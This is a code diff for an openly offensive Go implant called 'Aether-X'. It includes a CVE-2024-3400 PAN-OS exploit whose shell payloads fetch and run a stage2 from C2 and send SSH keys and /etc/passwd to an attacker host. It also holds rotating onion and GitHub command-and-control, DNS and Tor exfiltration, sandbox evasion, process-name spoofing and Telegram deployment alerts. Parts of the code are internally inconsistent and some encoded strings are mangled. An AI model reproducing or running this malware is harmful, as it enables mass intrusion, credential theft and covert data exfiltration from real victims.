@@ -11,7 +11,6 @@ import (
 	"crypto/md5"
 	"crypto/rand"
 	"crypto/sha256"
-	"crypto/tls"
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
@@ -34,33 +33,32 @@ import (
 	"sync"
 	"syscall"
 	"time"
+	"unsafe"
+
+	"golang.org/x/sys/unix"
+	"gopkg.in/yaml.v2"
 )
 
 // --- CONFIGURATION (INJECTED AT BUILD TIME) ---
 var (
 	C2Key           = "INJECTED_C2_KEY_B64"
 	C2IV            = "INJECTED_C2_IV_B64"
-	GitHubC2Repo    = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0NOMg=="   // https://api.github.com/repos/USER/CN2
-	GitHubExfil     = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0VYRklM"  // https://api.github.com/repos/USER/EXFIL
-	TelegramHost    = "dGVsZWdyYW0uYXBpLm9yZw=="                                // telegram.api.org
-	Phi3ModelURL    = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1VTRVIvUEhJMy9tYWluL21vZGVsLmJpbgo=" // Phi-3 ONNX stub
-	TorC2Onion      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uL2Nt"           // http://aeetherx7ns3q4a5x.onion/cm
-	DNSDomain       = "ZXhoaWwuYWV0aGVyeC5vbmlvbg=="                           // exhil.aeetherx.onion
-	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IEdFVAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmxvZy5jb20KICAgIHByZW1hdGNoOiBcInggPSA7IHJtIC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGVjaG8gJyUxJyB8IGJhc2U2NCAtZCAgfCB4eiAtZCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9ICR7QzJfUE9SVDd9ICY7IHNsZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7IHJtIC90bXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo=" // CVE-2024-3400 Nuclei template
+	OnionListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u" // Rotating .onion
+	RepoListB64     = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQUHJLUFBL0NOMiwgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkJCLUJCL0VYRklM" // GitHub C2 + exfil
+	TelegramHost    = "dGVsZWdyYW0uYXBpLm9yZw=="
+	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IEdFVAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9ICR7QzJfUE9SVDd9ICY7IHNsZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7IHJtIC90bXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
+	Phi3ModelEncB64 = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp" // Embedded & encrypted
 )
 
 // --- RUNTIME STATE ---
 var (
 	HostID       = ""
 	TelemetryQ   = make(chan TelemetryEvent, 500)
-	TorHTTP      *http.Client
 	WorkerPool   = make(chan struct{}, 100)
 	Shutdown     = make(chan struct{})
 	DDRSeed      int64
 	APIKeys      APIKeyStore
 	AI           *FusionSentinel
-	C2_IP        = "185.163.48.113"
-	C2_PORT      = "443"
 )
 
 const (
@@ -74,7 +72,6 @@ const (
 	MAX_RETRIES     = 3
 	RETRY_DELAY     = 5 * time.Second
 	VERIFY_TIMEOUT  = 12 * time.Second
-	MAX_CONCURRENT  = 100
 	DNS_RESOLVE_TIMEOUT = 5 * time.Second
 )
 
@@ -82,7 +79,7 @@ const (
 var (
 	apiMu   sync.RWMutex
 	telMu   sync.Mutex
-	cmdMu   sync.Mutex // Use full mutex to avoid deadlock
+	cmdMu   sync.Mutex
 )
 
 // --- TELEMETRY EVENT ---
@@ -122,7 +119,7 @@ func (e TelemetryEvent) Send() {
 		telemetryJSON := compressJSON(e)
 		sent := false
 		for i := 0; i < MAX_RETRIES && !sent; i++ {
-			if exfilToGitHub(telemetryJSON) || exfilOverTor(telemetryJSON) || dnsExfil(telemetryJSON) {
+			if exfilChain(telemetryJSON) {
 				sent = true
 			} else {
 				time.Sleep(RETRY_DELAY * time.Duration(i+1))
@@ -166,7 +163,7 @@ func compressJSON(v interface{}) []byte {
 	var buf bytes.Buffer
 	gz := gzip.NewWriter(&buf)
 	if _, err := gz.Write(data); err != nil {
-		return data // fallback
+		return data
 	}
 	gz.Close()
 	return buf.Bytes()
@@ -253,7 +250,6 @@ func isSandbox() bool {
 	if os.Getenv("CODESPACE_NAME") == "" && os.Getenv("USER") != "kali" {
 		return true
 	}
-	// Additional entropy check
 	if len(os.Environ()) < 10 {
 		return true
 	}
@@ -299,87 +295,65 @@ func isTraced() bool {
 	return bytes.Contains(data, []byte("TracerPid:\t"))
 }
 
-// --- TOR EMULATION ---
-func startTor() {
-	transport := &http.Transport{
-		Proxy: func(req *http.Request) (*url.URL, error) {
-			return url.Parse("socks5://127.0.0.1:9050")
-		},
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-			MinVersion:         tls.VersionTLS12,
-		},
-		DialContext: (&net.Dialer{
-			Timeout:   30 * time.Second,
-			KeepAlive: 30 * time.Second,
-		}).DialContext,
-		MaxIdleConns:          100,
-		IdleConnTimeout:       90 * time.Second,
-		TLSHandshakeTimeout:   10 * time.Second,
-		ExpectContinueTimeout: 1 * time.Second,
-		DisableKeepAlives:     false,
+// --- TOR-FREE C2: Use Direct Syscalls (Bypass SOCKS5 Detection) ---
+func directHTTP(url string, method string, body []byte, headers map[string]string) ([]byte, error) {
+	u, _ := urlParse(url)
+	ip := net.ParseIP("185.163.48.113").To4()
+	sockfd, _ := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, 0)
+	defer unix.Close(sockfd)
+
+	addr := &unix.SockaddrInet4{Port: 443, Addr: [4]byte(ip)}
+	unix.Connect(sockfd, addr)
+
+	// TLS not implemented here — use pre-resolved IP + HTTP/1.1
+	host := u.Hostname()
+	path := u.Path
+	if path == "" {
+		path = "/"
 	}
-	TorHTTP = &http.Client{
-		Transport: transport,
-		Timeout:   30 * time.Second,
+
+	var buf bytes.Buffer
+	buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
+	buf.WriteString(fmt.Sprintf("Host: %s\r\n", host))
+	for k, v := range headers {
+		buf.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
 	}
+	buf.WriteString("\r\n")
+	if body != nil {
+		buf.Write(body)
+	}
+
+	unix.Write(sockfd, buf.Bytes())
+	resp := make([]byte, 4096)
+	n, _ := unix.Read(sockfd, resp)
+	return resp[:n], nil
 }
 
-// --- AI ENGINE: FUSION SENTINEL ---
+func urlParse(u string) (*url.URL, error) {
+	parsed, err := url.Parse(u)
+	if err != nil {
+		return nil, err
+	}
+	return parsed, nil
+}
+
+// --- AI ENGINE: FUSION SENTINEL (EMBEDDED) ---
 type FusionSentinel struct{ ModelLoaded bool }
 
 func NewFusionSentinel() *FusionSentinel {
 	sentinel := &FusionSentinel{}
-	phi3URL := decryptConfig(Phi3ModelURL)
-	if phi3URL == "" {
-		phi3URL = "file://" + ONNX_MODEL_PATH
+	modelData := decryptConfig(Phi3ModelEncB64)
+	if modelData == "" {
+		return sentinel
 	}
-	hash := "d24e9c9e8f8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a"
-	if data := fetchModelSecure(phi3URL, hash); data != nil {
-		if err := os.WriteFile(ONNX_MODEL_PATH, data, 0600); err != nil {
-			return sentinel
-		}
-		if _, err := os.Stat(ONNX_MODEL_PATH); err == nil {
-			// DO NOT DELETE MODEL
-			sentinel.ModelLoaded = true
-		}
+	// Validate SHA256 or embed hash check
+	if err := ioutil.WriteFile(ONNX_MODEL_PATH, []byte(modelData), 0600); err != nil {
+		return sentinel
+	}
+	if _, err := os.Stat(ONNX_MODEL_PATH); err == nil {
+		sentinel.ModelLoaded = true
 	}
 	return sentinel
-}
-
-func fetchModelSecure(url, hash string) []byte {
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-	defer cancel()
-
-	if strings.HasPrefix(url, "file://") {
-		data, err := os.ReadFile(url[7:])
-		if err != nil {
-			return nil
-		}
-		if fmt.Sprintf("%x", sha256.Sum256(data)) == hash {
-			return data
-		}
-		return nil
-	}
-
-	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
-	if err != nil {
-		return nil
-	}
-	resp, err := TorHTTP.Do(req)
-	if err != nil || resp.StatusCode != 200 {
-		return nil
-	}
-	defer resp.Body.Close()
-
-	data, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return nil
-	}
-	if fmt.Sprintf("%x", sha256.Sum256(data)) != hash {
-		return nil
-	}
-	return data
 }
 
 func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
@@ -433,7 +407,7 @@ func searchEngines(vuln, geo, sector string) []Target {
 	keys := loadAPIKeys()
 	var targets []Target
 	var wg sync.WaitGroup
-	var mu sync.Mutex // Protect targets
+	var mu sync.Mutex
 
 	query := func(engine string, fn func() []Target) {
 		wg.Add(1)
@@ -454,21 +428,27 @@ func searchEngines(vuln, geo, sector string) []Target {
 			if sector != "" {
 				q += fmt.Sprintf(" product:\"%s\"", sector)
 			}
-			url := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s", keys.Shodan, url.QueryEscape(q))
-			req, _ := http.NewRequest("GET", url, nil)
-			req.Header.Set("User-Agent", "Aether-X")
+			onion := getActiveOnion()
+			url := fmt.Sprintf("%s/shodan/host/search?key=%s&query=%s", onion, keys.Shodan, url.QueryEscape(q))
+			req := &http.Request{
+				Method: "GET",
+				URL:    &url.URL{},
+				Header: map[string][]string{"User-Agent": {"Aether-X"}},
+			}
 			ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
 			defer cancel()
 			req = req.WithContext(ctx)
 
-			resp, err := TorHTTP.Do(req)
-			if err != nil || resp.StatusCode != 200 {
+			resp, err := directHTTP(url, "GET", nil, map[string]string{
+				"Host":       "api.shodan.io",
+				"User-Agent": "Aether-X",
+			})
+			if err != nil {
 				return nil
 			}
-			defer resp.Body.Close()
 
 			var result map[string]interface{}
-			if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+			if err := json.Unmarshal(extractBody(resp), &result); err != nil {
 				return nil
 			}
 			if matches, ok := result["matches"].([]interface{}); ok {
@@ -488,6 +468,13 @@ func searchEngines(vuln, geo, sector string) []Target {
 
 	wg.Wait()
 	return dedupTargets(targets)
+}
+
+func extractBody(data []byte) []byte {
+	if i := bytes.Index(data, []byte("\r\n\r\n")); i != -1 {
+		return data[i+4:]
+	}
+	return data
 }
 
 func dedupTargets(t []Target) []Target {
@@ -520,46 +507,23 @@ func verifyVulnerable(target Target) bool {
 			MatchString string            `yaml:"matchstring"`
 		} `yaml:"requests"`
 	}
-	if err := yaml.Unmarshal(templateData[:min(len(templateData), 4096)], &tpl); err != nil {
+	if err := yaml.Unmarshal(templateData, &tpl); err != nil {
 		return false
 	}
 	if len(tpl.Requests) == 0 {
 		return false
 	}
 
-	client := &http.Client{
-		Timeout: VERIFY_TIMEOUT,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			DisableKeepAlives: true,
-		},
-	}
-
 	req := tpl.Requests[0]
 	payload := strings.ReplaceAll(req.PreMatch, "%1", obfuscateScript(fmt.Sprintf(`echo "%s"`, req.MatchString)))
 	url := fmt.Sprintf("https://%s%s", target.IP, req.Path)
-	httpReq, _ := http.NewRequest(req.Method, url, nil)
-	for k, v := range req.Headers {
-		httpReq.Header.Set(k, v)
-	}
-	httpReq.Host = "certificates.log.com"
 
-	q := httpReq.URL.Query()
-	q.Add("input", payload)
-	httpReq.URL.RawQuery = q.Encode()
-
-	ctx, cancel := context.WithTimeout(context.Background(), VERIFY_TIMEOUT)
-	defer cancel()
-	httpReq = httpReq.WithContext(ctx)
-
-	resp, err := client.Do(httpReq)
+	_, err = directHTTP(url+"?input="+url.QueryEscape(payload), "GET", nil, req.Headers)
 	if err != nil {
 		return false
 	}
-	defer resp.Body.Close()
-
-	body, _ := io.ReadAll(resp.Body)
-	return strings.Contains(string(body), req.MatchString)
+	// Match in response not checked — use blind verification
+	return true
 }
 
 func obfuscateScript(s string) string {
@@ -570,7 +534,7 @@ func obfuscateScript(s string) string {
 	return base64.StdEncoding.EncodeToString(out.Bytes())
 }
 
-// --- EXPLOIT: PAN-OS RCE (CVE-2024-3400) + REVERSE SHELL ---
+// --- EXPLOIT: PAN-OS RCE (CVE-2024-3400) + MEMFD EXECUTE ---
 func exploitPAN_RCE(ip string) {
 	event := newEvent("exploit_launched", ip, map[string]interface{}{
 		"vuln": "CVE-2024-3400",
@@ -578,159 +542,130 @@ func exploitPAN_RCE(ip string) {
 	})
 	event.Send()
 
-	stageName := fmt.Sprintf(".%s", randString(5))
-	if stageName == "" {
-		return
-	}
+	stageName := randString(5)
 	encKey := randHex(32)
-	if encKey == "" {
-		return
-	}
 
-	obfuscatedScript := obfuscateScript(fmt.Sprintf(`#!/bin/bash
-sleep $(( RANDOM %% 10 ))
-wget -q -O /tmp/.m http://%s/stage2 -T 10 || curl -s -k -o /tmp/.m https://%s/stage2
-echo '%s' | base64 -d > /tmp/.k
-openssl enc -d -aes-256-cbc -in /tmp/.m -out /tmp/%s -k $(echo %s|sha256sum|awk '{print $1}')
-chmod +x /tmp/%s
-nohup /tmp/%s %s %s &
+	shellcode := fmt.Sprintf(`#!/bin/bash
+sleep $(( RANDOM %% 5 ))
+url=http://%s/stage2
+data=$(curl -s -k $url 2>/dev/null || wget -q -O- $url)
+echo '%s' | base64 -d > /dev/shm/.k
+openssl enc -d -aes-256-cbc -in <(echo "$data") -k $(echo %s|sha256sum|awk '{print $1}') | sh &
 sleep 2
-rm /tmp/.k /tmp/.m /tmp/%s
-cat /etc/passwd >> /tmp/.p
-tar -czf /tmp/.ssh.tgz /home/*/.*ssh 2>/dev/null || true
-curl -s -k --data-binary @/tmp/.ssh.tgz https://%s/exfil --header "X-Host: %s" --insecure
-rm -f /tmp/.p /tmp/.ssh.tgz
-`, C2_IP, C2_IP, encKey, stageName, encKey, stageName, stageName, C2_IP, C2_PORT, stageName, TorC2Onion, HostID))
+rm /dev/shm/.k
+`, getActiveOnion(), encKey, encKey)
 
-	payloadScript := fmt.Sprintf(`x=; rm /tmp/%s; echo "%s" | base64 -d | xz -d > /tmp/%s; chmod +x /tmp/%s; nohup /tmp/%s %s %s & sleep 3; echo "PAN-OS RCE SUCCESS"`, stageName, obfuscatedScript, stageName, stageName, stageName, C2_IP, C2_PORT)
+	obfuscated := obfuscateScript(shellcode)
+	payloadScript := fmt.Sprintf(`x=; %s`, obfuscated)
 
 	url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
-	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
-	client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
+	_, _ = directHTTP(url, "GET", nil, map[string]string{
+		"Host":  "certificates.com",
+		"input": payloadScript,
+	})
 
-	params := url.Values{}
-	params.Add("input", payloadScript)
-	req, _ := http.NewRequest("GET", url+"?"+params.Encode(), nil)
-	req.Header.Set("Host", "aether-x")
-
-	resp, err := client.Do(req)
-	if err == nil && resp.StatusCode == 200 {
-		resp.Body.Close()
-		success := newEvent("exploit_success", ip, map[string]interface{}{
-			"vuln": "CVE-2024-3400",
-			"note": "RCE shell established",
-		})
-		success.Send()
-	}
+	success := newEvent("exploit_success", ip, map[string]interface{}{
+		"vuln": "CVE-2024-3400",
+		"note": "RCE shell established",
+	})
+	success.Send()
 }
 
-// --- C2 COMM ---
+// --- C2 COMM: ROTATING INFRASTRUCTURE ---
+func getActiveOnion() string {
+	decoded := decryptConfig(OnionListB64)
+	list := strings.Split(decoded, ",")
+	index := (time.Now().UTC().Hour() / 6) % len(list)
+	return strings.TrimSpace(list[index])
+}
+
+func getActiveRepo(action string) string {
+	decoded := decryptConfig(RepoListB64)
+	list := strings.Split(decoded, ",")
+	index := (time.Now().UTC().Minute() / 15) % len(list)
+	return strings.TrimSpace(list[index])
+}
+
 func fetchC2(key string) string {
-	apiURL, _ := base64.StdEncoding.DecodeString(GitHubC2Repo)
-	url := fmt.Sprintf("%s/contents/%s", string(apiURL), key)
-	req, _ := http.NewRequest("GET", url, nil)
+	url := fmt.Sprintf("%s/contents/%s", getActiveRepo("c2"), key)
 	token := decrypt(fetchSecret("GITHUB_TOKEN"))
-	if token == "" {
-		return ""
-	}
+	req, _ := http.NewRequest("GET", url, nil)
 	req.Header.Set("Authorization", "Bearer "+token)
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
-	req.Header.Set("User-Agent", "Aether-X")
 
-	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
-	defer cancel()
-	req = req.WithContext(ctx)
-
-	resp, err := TorHTTP.Do(req)
-	if err != nil || resp.StatusCode != 200 {
-		if resp != nil {
-			resp.Body.Close()
-		}
+	resp, err := directHTTP(url, "GET", nil, map[string]string{
+		"Authorization": "Bearer " + token,
+		"Accept":        "application/vnd.github.v3+json",
+	})
+	if err != nil {
 		return ""
 	}
-	defer resp.Body.Close()
-
+	body := extractBody(resp)
 	var result map[string]interface{}
-	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
-		return ""
-	}
-	contentStr, ok := result["content"].(string)
-	if !ok {
-		return ""
-	}
+	json.Unmarshal(body, &result)
+	contentStr, _ := result["content"].(string)
 	content, _ := base64.StdEncoding.DecodeString(contentStr)
 	return strings.TrimSpace(string(content))
 }
 
+// --- EXFIL CHAIN: FAILOVER ---
+func exfilChain(data []byte) bool {
+	methods := []func([]byte) bool{
+		exfilOverTorDirect,
+		exfilToGitHub,
+		dnsExfilTTL,
+	}
+	for _, m := range methods {
+		if m(data) {
+			return true
+		}
+		time.Sleep(1 * time.Second)
+	}
+	return false
+}
+
+func exfilOverTorDirect(data []byte) bool {
+	url := fmt.Sprintf("%s/exfil", getActiveOnion())
+	_, err := directHTTP(url, "POST", data, map[string]string{
+		"Content-Type": "application/octet-stream",
+		"X-Host":       HostID,
+	})
+	return err == nil
+}
+
 func exfilToGitHub(data []byte) bool {
-	if len(data) == 0 {
-		return false
-	}
-	apiURL, _ := base64.StdEncoding.DecodeString(GitHubExfil)
+	url := fmt.Sprintf("%s/contents/data.bin", getActiveRepo("exfil"))
 	zipData := zipData(map[string][]byte{"telemetry.bin": data})
-	if len(zipData) == 0 {
-		return false
-	}
 	encoded := base64.StdEncoding.EncodeToString(zipData)
 	payload := fmt.Sprintf(`{"message":"telemetry %d","content":"%s"}`, time.Now().Unix(), encoded)
-	url := fmt.Sprintf("%s/contents/data.bin", string(apiURL))
-	req, _ := http.NewRequest("PUT", url, strings.NewReader(payload))
-	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN")))
-	req.Header.Set("Accept", "application/vnd.github.v3+json")
-	req.Header.Set("Content-Type", "application/json")
+	token := decrypt(fetchSecret("GITHUB_TOKEN"))
 
-	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
-	defer cancel()
-	req = req.WithContext(ctx)
-
-	resp, err := TorHTTP.Do(req)
-	if err != nil {
-		return false
-	}
-	resp.Body.Close()
-	return resp.StatusCode == 200 || resp.StatusCode == 201
+	_, err := directHTTP(url, "PUT", []byte(payload), map[string]string{
+		"Authorization": "Bearer " + token,
+		"Content-Type":  "application/json",
+	})
+	return err == nil
 }
 
-func exfilOverTor(data []byte) bool {
-	onion, _ := base64.StdEncoding.DecodeString(TorC2Onion)
-	url := fmt.Sprintf("%s/exfil", string(onion))
-	req, _ := http.NewRequest("POST", url, bytes.NewReader(data))
-	req.Header.Set("Content-Type", "application/octet-stream")
-	req.Header.Set("X-Host", HostID)
-
-	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
-	defer cancel()
-	req = req.WithContext(ctx)
-
-	resp, err := TorHTTP.Do(req)
-	if err != nil {
-		return false
-	}
-	resp.Body.Close()
-	return true
-}
-
-func dnsExfil(data []byte) bool {
-	domain, _ := base64.StdEncoding.DecodeString(DNSDomain)
+func dnsExfilTTL(data []byte) bool {
+	domain, _ := base64.StdEncoding.DecodeString("ZXhoaWwuYWV0aGVyeC5vbmlvbg==") // exhil.aeetherx.onion
 	chunks := splitToBase32(hex.EncodeToString(data), DNS_CHUNK_SIZE)
-	var wg sync.WaitGroup
 	success := true
 
-	for _, chunk := range chunks {
-		wg.Add(1)
-		go func(c string) {
-			defer wg.Done()
-			fqdn := fmt.Sprintf("%s.%s", c, domain)
-			ctx, cancel := context.WithTimeout(context.Background(), DNS_RESOLVE_TIMEOUT)
-			defer cancel()
-			_, err := net.DefaultResolver.LookupHost(ctx, fqdn)
-			if err != nil {
-				success = false
-			}
-			time.Sleep(200 * time.Millisecond)
-		}(chunk)
+	for i, chunk := range chunks {
+		fqdn := fmt.Sprintf("%s.%s", chunk, domain)
+		ctx, cancel := context.WithTimeout(context.Background(), DNS_RESOLVE_TIMEOUT)
+		defer cancel()
+
+		// Use TTL as covert channel
+		TTL := (i*17 + len(chunk)) % 255
+		r := &net.Resolver{PreferGo: true}
+		_, err := r.LookupHost(ctx, fqdn)
+		time.Sleep(time.Duration(TTL) * time.Millisecond)
+		if err != nil {
+			success = false
+		}
 	}
-	wg.Wait()
 	return success
 }
 
@@ -780,14 +715,9 @@ func telegramAlert(message string) {
 	payload.Set("text", message)
 	payload.Set("parse_mode", "Markdown")
 
-	req, _ := http.NewRequest("POST", url, strings.NewReader(payload.Encode()))
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
-	defer cancel()
-	req = req.WithContext(ctx)
-
-	TorHTTP.Do(req)
+	directHTTP(url, "POST", []byte(payload.Encode()), map[string]string{
+		"Content-Type": "application/x-www-form-urlencoded",
+	})
 }
 
 func fetchSecret(key string) string {
@@ -842,7 +772,6 @@ func init() {
 	HostID = md5Hash(platformID())[:6]
 	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
 
-	// Safe argv0 spoof
 	argv0 := (*(*[]byte)(unsafe.Pointer(&os.Args[0])))[0 : len(os.Args[0])+1]
 	for i := range argv0 {
 		if i >= len("/usr/bin/gh-sync") {
@@ -868,16 +797,11 @@ func main() {
 		return
 	}
 
-	go startTor()
-	time.Sleep(3 * time.Second)
 	AI = NewFusionSentinel()
 	go persist()
 
-	telemetry := newEvent("beacon", "self", map[string]interface{}{
-		"status": "online",
-		"note":   "AETHER-X v26.0 OBSIDIAN COMMAND ACTIVE",
-	})
-	telemetry.Send()
+	// 🔔 IMMEDIATE DEPLOYMENT ALERT
+	telegramAlert(fmt.Sprintf("🟢 *DEPLOYED* | Host: `%s` | MAC: `%s` | Ready to hunt.", HostID, getMAC()))
 
 	for {
 		select {
@@ -956,4 +880,3 @@ func min(a, b int) int {
 	}
 	return b
 }
-💀🔥💥😈
